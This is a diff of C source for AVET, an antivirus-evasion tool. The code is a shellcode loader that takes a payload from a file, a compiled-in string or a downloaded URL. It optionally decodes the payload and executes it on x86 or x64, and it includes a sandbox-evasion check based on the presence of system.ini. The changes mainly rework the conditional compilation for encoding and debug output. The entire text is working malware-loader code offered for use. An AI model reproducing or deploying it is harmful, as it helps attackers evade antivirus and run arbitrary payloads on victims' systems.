@@ -36,9 +36,7 @@ Web: https://github.com/govolution/avet
 
 int get_filesize(char *fvalue);
 unsigned char* load_textfile(char *fvalue, unsigned char *buf, int size2);
-#ifdef ENCRYPT
 unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size);
-#endif
 void exec_shellcode(unsigned char *shellcode);
 void exec_shellcode64(unsigned char *shellcode);
 #ifdef UVALUE
@@ -57,6 +55,9 @@ int main (int argc, char **argv)
 
 	// do evading here
 	#ifdef SANDBOX_FOPEN
+		#ifdef PRINT_DEBUG
+		printf("use fopen sandbox escape\n");
+		#endif
 		FILE *fp = fopen("c:\\windows\\system.ini", "rb");
 		if (fp == NULL)
 			return 0;
@@ -69,7 +70,7 @@ int main (int argc, char **argv)
 
 	#ifdef PRINT_DEBUG
 		printf ("fvalue = %s ", fvalue);
-		printf ("uvalue = %s ", uvalue);
+		printf ("uvalue = %s \n", uvalue);
 		for (index = optind; index < argc; index++)
 			printf ("Non-option argument %s\n", argv[index]);
 	#endif
@@ -95,25 +96,35 @@ int main (int argc, char **argv)
 		int size;
 //#ifndef FVALUE
 #ifdef LVALUE
-		#ifdef PRINT_DEBUG
-			printf("exec shellcode from file\n");
-		#endif
-
+	#ifdef PRINT_DEBUG
+		printf("exec shellcode from file\n");
+	#endif
 		size = get_filesize(fvalue);
 		buffer = load_textfile(fvalue, buffer, size);
 #endif
-#ifdef FVALUE
+	#ifdef FVALUE
 		size = strlen (FVALUE);
 		buffer = FVALUE;
-#endif
+	#endif
 
+	#ifdef ENCRYPT 
+		#ifdef PRINT_DEBUG
+		printf("exec shellcode with decode_shellcode\n");
+		#endif
 		shellcode = decode_shellcode(buffer,shellcode,size);
-		#ifndef X64 
-			exec_shellcode(shellcode);
+	#endif
+	#ifndef ENCRYPT
+		#ifdef PRINT_DEBUG
+		printf("exec shellcode without decode_shellcode\n");
 		#endif
-		#ifdef X64
-			exec_shellcode64(shellcode);
-		#endif
+		shellcode = buf;
+	#endif
+	#ifndef X64 
+		exec_shellcode(shellcode);
+	#endif
+	#ifdef X64
+		exec_shellcode64(shellcode);
+	#endif
 	}
 	// exec from url
 #ifdef UVALUE
@@ -127,29 +138,33 @@ int main (int argc, char **argv)
 		sh_filename = ie_download(uvalue, sh_filename);
 		int x=strlen(sh_filename);
 		
-		#ifdef PRINT_DEBUG	
-			printf("\n\n%d\n\n", x);
-		#endif 
+#ifdef PRINT_DEBUG	
+		printf("\n\n%d\n\n", x);
+#endif
 
 		unsigned char *buffer;
 		unsigned char *shellcode;
 
 		int size = get_filesize(sh_filename);
 		buffer = load_textfile(sh_filename, buffer, size);
+#ifdef ENCRYPT
 		shellcode = decode_shellcode(buffer,shellcode,size);
-		#ifndef X64 
-			exec_shellcode(shellcode);
-		#endif
-		#ifdef X64
-			exec_shellcode64(shellcode);
-		#endif
+#else
+		shellcode = buf;
+#endif
+#ifndef X64 
+		exec_shellcode(shellcode);
+#endif
+#ifdef X64
+		exec_shellcode64(shellcode);
+#endif
 	}
 #endif
 
 	return 0;
 }
 
-
+// TODO use ifdef here too
 int get_filesize(char *fvalue)
 {
 	int size,rc1;
@@ -205,7 +220,6 @@ unsigned char* load_textfile(char *fvalue, unsigned char *buffer, int size)
 }
 
 // return pointer to shellcode
-#ifdef ENCRYPT
 unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size)
 {
 	int j=0;
@@ -236,13 +250,14 @@ unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode,
 
 	return shellcode;
 }
-#endif
 
 #ifndef X64
 void exec_shellcode(unsigned char *shellcode)
 {
 	#ifdef PRINT_DEBUG
 		printf("exec_shellcode\n ");
+		int size=strlen(shellcode);
+		printf("shellcode size: %d\n", size);
 	#endif
 
 	int (*funct)();
@@ -256,6 +271,8 @@ void exec_shellcode64(unsigned char *shellcode)
 {
 #ifdef PRINT_DEBUG
 	printf("exec_shellcode64\n ");
+	int size=strlen(shellcode);
+	printf("shellcode size: %d\n", size);
 #endif
 	int len=strlen(shellcode);
 	DWORD l=0;
